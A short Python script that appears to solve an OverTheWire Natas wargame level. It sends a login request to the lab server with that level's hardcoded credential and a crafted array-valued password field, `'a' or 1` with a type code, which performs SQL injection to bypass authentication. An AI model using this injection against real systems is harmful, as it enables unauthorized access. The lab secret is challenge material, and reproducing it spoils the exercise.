import requests
from requests.auth import HTTPBasicAuth

SQL_NUMERIC = 4

url = "http://natas30.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH")
headers = { "Content-Type": "application/x-www-form-urlencoded" }

params = { "username": "natas30", "password": ["'a' or 1", 4]}

res = requests.post(url, auth=auth, headers=headers, data=params)
